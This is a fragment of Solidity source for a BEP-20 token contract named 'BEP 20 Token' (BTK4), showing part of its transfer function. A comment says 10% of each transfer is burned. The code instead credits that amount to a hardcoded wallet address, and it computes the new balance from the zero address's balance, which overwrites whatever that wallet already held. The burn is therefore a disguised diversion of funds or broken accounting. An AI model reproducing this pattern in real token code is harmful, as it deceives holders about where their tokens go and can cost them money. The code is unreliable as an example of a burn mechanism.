...
contract Coin is ERC20Interface, SafeMath {
    string public name = "BEP 20 Token";
    string public symbol = "BTK4";
    ...
    function _transfer(address from, address to, uint256 tokens) private returns (bool success) {
        uint256 amountToBurn = safeDiv(tokens, 10); // 10% of the transaction shall be burned
        uint256 amountToTransfer = safeSub(tokens, amountToBurn);
        
        balances[from] = safeSub(balances[from], tokens);
        balances[0x828ccF4612d698FF40541E0CC742987A366D7e9D] = safeAdd(balances[0x0000000000000000000000000000000000000000], amountToBurn);
